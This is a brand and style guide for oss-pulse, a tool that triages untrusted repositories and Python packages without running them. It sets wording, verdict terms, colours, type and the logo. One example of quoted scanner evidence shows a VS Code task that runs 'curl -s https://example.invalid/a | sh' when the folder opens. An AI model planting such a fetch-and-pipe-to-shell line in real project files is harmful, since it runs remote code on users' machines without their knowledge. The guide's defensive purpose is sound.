# oss-pulse brand guide

How oss-pulse looks and talks. Read it before you change anything a person will see. Exact layouts are in [output-spec.md](output-spec.md).

## What it is

> oss-pulse reads a repository someone sent you, or the Python packages you are about to install, and runs none of it. It tells you what would run, and when, and quotes the lines that say so.

Tagline: **Triage for code you didn't write.** "Triage" is the security-ops word; it appears in the tagline and nowhere in tool output.

The name is `oss-pulse`, lowercase and hyphenated, spelled the same in prose, in titles, at the start of a sentence and on the command line. A tool that flags lookalike names gets one spelling.

## How it sounds

Like the colleague you'd ask before opening an attachment: the answer first, the working after, in a level voice. It is exact about evidence and plain about the next step. It says what it didn't read, and it describes what a release does rather than who made it. Write so that a developer holding a take-home from a recruiter they've never met can act on it, and a security engineer can't fault it.

Lead with the verdict in plain words. Counts go last.

    before  **8 findings** · 🔴 2 critical · 🟠 4 high · 🟡 1 medium · 🔵 1 low
    after   hold  Don't open this folder in VS Code, and don't install its dependencies.

Quote the bytes from the line you cite, and show the name the person typed.

    before  .vscode/tasks.json:1  runOn: folderOpen        (the command, on line 7, is lost)
    before  looks like 'requests' (one character different)        evidence: requests
    after   .vscode/tasks.json:8 runs a task when the folder opens
              7 │ "command": "curl -s https://example.invalid/a | sh",
    after   requirements.txt:1 has reqeusts (requests, u and e swapped)

Say what the code does. Only a cited source gets to say malicious, and upkeep is never a threat.

    before  abandoned-lib  critical     (archived; the same level as evil-lib's OSV-MAL)
    after   watch   abandoned-lib 1.0   archived; last release 2023-10-31   upkeep
    after   OSV lists evil-lib as malicious (MAL-2026-0001).

Numbers, dates and real plurals. Under 60 days say "N days ago"; from 60 days give the date.

    before  3.0 was uploaded 48 hour(s) ago ... Consider pinning the previous version until it has aged.
    after   2 days old, after 500 quiet days

Say what you didn't read, next to the result it affects.

    before  (a 38 MB file skipped without a word)
    after   not read  data/cities.json   38 MB, over the 5 MB limit

Next steps are actions, in order, for the person who has to take them.

    before  Do not open it in VS Code with Workspace Trust or run `npm install`/`pip install` outside a disposable VM.
    after   1  Delete the folder, or open it only in Restricted Mode: when VS Code asks whether you
               trust the authors, choose "No, I don't trust the authors". Tasks don't run in Restricted Mode.

When CI fails, name the gate and the package, on the line that caused it. Describe the tool the same way everywhere.

    before  ::error::OSS Pulse found supply-chain risk at or above the fail-on level. See the job summary.
    after   ::error file=requirements.txt,line=7,title=oss-pulse hold::reqeusts 0.0.1: requests with u and e swapped (TYPO-001)
    before  OSS Pulse: open-source ecosystem health lakehouse.
    after   oss-pulse 0.1.0: triage for code you didn't write

## Words

One word per idea, the same in the terminal, JSON, Markdown and docs.

| verdict | means | exit | terminal |
|---|---|---|---|
| hold | Stop before the next step: opening, installing, merging. | 1 by default | bold red |
| review | A person should read the cited lines, then decide. | 1 with `--fail-on review` | bold |
| watch | Fine today; worth knowing. Upkeep, CI hygiene, a release under 7 days old. | 1 with `--fail-on watch` | plain |
| clear | No rule matched. Always followed by what was read. Not an audit. | 0 | bold, dim in lists |

A `note` never changes the verdict. `not checked` and `not read` are coverage, always with the reason; `--strict` makes them exit 2. Severities (critical to low) stay on rules, in JSON and in SARIF, and the default view doesn't print them. Scan findings are grouped by when the code would run: on open, on install, on commit, on run, in CI.

- A finding is one rule match, with its rule ID, `file:line` and the bytes that matched. A merged row still counts every rule in it.
- Evidence is those bytes after `safe_text.visible()`, never paraphrased. A long line is cut around the match with `…`.
- The grade (direct, strong or circumstantial) says how much a rule means on its own. It shows with `-v`, in JSON and in SARIF.
- Upkeep means archived, inactive, one maintainer, stale releases or a low Scorecard. Attested means a PEP 740 Trusted Publishing attestation. A lookalike is a typosquat, in prose.
- "seen in" names a real incident with its month or year (Ultralytics 8.3.45, December 2024). The one hedge is "reportedly", worded the same in every file.
- The tool's own verbs are read, nothing run and nothing installed. VS Code's words are quoted exactly: Restricted Mode, "No, I don't trust the authors".

Not about a target, ever: safe, secure, clean, protected, guaranteed. Not "malicious" unless an advisory says so; not hijacked, compromised or attacker. Not "one letter away": name the edit.

## Errors

Anything that stopped oss-pulse from finishing goes to stderr, exits 2, and says what happened, why, and what to type next. The first line starts lowercase with no full stop. No traceback without `-v`, no Rich panels, no "Oops". `error:` is bold, not red: red means hold, and an error says nothing about the code.

    error: can't check uv.lock: lockfiles aren't supported yet

      oss-pulse reads pyproject.toml and requirements*.txt. To check everything
      uv.lock pins, transitive dependencies included, export it first:

        uv export -o requirements-lock.txt
        oss-pulse check requirements-lock.txt

## What we don't write

These read as generated text. `anti_tells.py` checks product strings and docs for them in CI.

- Emoji, including status dots and the padlock. Exclamation marks. Narration ("Let's", "I found", "One note follows").
- Bullets that open with a bold phrase and a colon. Headings that name a genre ("Supply-chain risk report") instead of the answer.
- Slogans in threes, "not just X, it's Y", rhetorical questions, lists padded to three.
- Em dashes, en dashes, " - " standing in for one, and the middle dot as punctuation.
- seamless, robust, leverage, empower, comprehensive, delve, unlock, elevate, cutting-edge, game-changer, effortless, harness, holistic, AI-powered, peace of mind, landscape; "simply" in an instruction.
- Hedging filler ("may potentially"); the grade word carries certainty. Counts typed by hand ("24 rules"); compute them.
- Invented findings on real packages. Mockups use example.invalid and the test fixtures.
- Shields, padlocks, heartbeat lines, magnifiers, radar, medical crosses, gradients, glows, drop-shadow cards, fake window chrome, cream paper, hacker green.
- In PR comments: a sign-off banner, or advice to the author on how to ignore a finding.

## Colour

Colour means a verdict, and only hold gets one. The logo has no colour of its own for the same reason.

| token | light | dark | for | contrast on bg / raised |
|---|---|---|---|---|
| `--bg` | #FFFFFF | #121416 | page | |
| `--bg-raised` | #F3F4F5 | #1B1E21 | code, terminal panes | |
| `--text` | #16181A | #E6E8EA | text, the mark, clear | 17.8 / 16.2, dark 15.0 / 13.6 |
| `--text-dim` | #596067 | #9CA3AA | secondary text, the terminal's dim | 6.4 / 5.8, dark 7.2 / 6.6 |
| `--rule` | #D9DDE1 | #2C3136 | hairlines | 1.4, decorative |
| `--hold` | #B3261E | #F47C70 | the word hold | 6.5 / 5.9, dark 7.0 / 6.3 |

Every text token is 6.0:1 or better on GitHub's own surfaces too. Dark values apply under `prefers-color-scheme: dark` (guarded by `:root:not([data-theme="light"])`) and under `[data-theme="dark"]`. PR comments use none of our colour.

The terminal gets ANSI names, so the reader's theme picks the shade: hold is `1;31`; review, clear, group labels, `next` and `error:` are bold (`1`); our words, rule IDs, line numbers and counts are dim (`2`); the matched bytes are underlined (`4`); paths, watch and the file's own bytes are plain. On stock themes ANSI yellow on white measures 1.9 to 3.1:1 and cyan 2.1 to 3.5:1, so review and watch use weight instead. Red is weakest on dark themes (3.2:1 in VS Code Dark+ and Windows Campbell), so hold is also bold and always spelled out.

`NO_COLOR` drops colour and keeps bold, dim and underline. `--color never`, `TERM=dumb` or a pipe gets no escape codes, and underlines become a caret line. `--color always` and `FORCE_COLOR` keep styles in a pipe. Never 256-colour, truecolour, backgrounds, italics or OSC 8 links: a path from a scanned folder must not open with one click.

## Type

The wordmark is Atkinson Hyperlegible Mono SemiBold (OFL), outlined. The Braille Institute drew it so l, 1 and I, and O and 0, can't be mistaken for each other, which is the mistake typosquats rely on. Our own images use Atkinson Hyperlegible Next for prose and the Mono for terminal text, ligatures off so `==` stays two characters. README, docs and PR comments use GitHub's fonts. The Streamlit theme is `primaryColor = "#16181A"` on `#FFFFFF`, with `secondaryBackgroundColor = "#F3F4F5"`; its default red would read as hold.

## The mark

The mark is a fermata, the music sign that means hold: stay on this note before you go on. hold is the verdict that asks you to stop, so it gets the logo. It is drawn, not typeset: a tapered arc over a dot on a 24-unit grid, with a heavier cut for 16 to 27 px. `mark.svg` holds both and picks one by the size it's drawn at; a renderer that ignores the CSS gets the heavy cut, which works everywhere.

`logo.svg` and `logo-dark.svg` have fixed colours for the README's `<picture>`. `mark.svg` is square and follows the system theme. `social-preview.png` is the 1280×640 upload for GitHub, made from `social-preview.svg`. Leave one character cell of clear space around the lockup. The smallest lockup is 20 px tall and the smallest mark 16 px. The mark is `--text` on `--bg` and nothing else: no red, no outline, no shadow, no other font for the wordmark, and never in terminal output. The Marketplace icon in action.yml is Feather `pause-circle` in `gray-dark`.
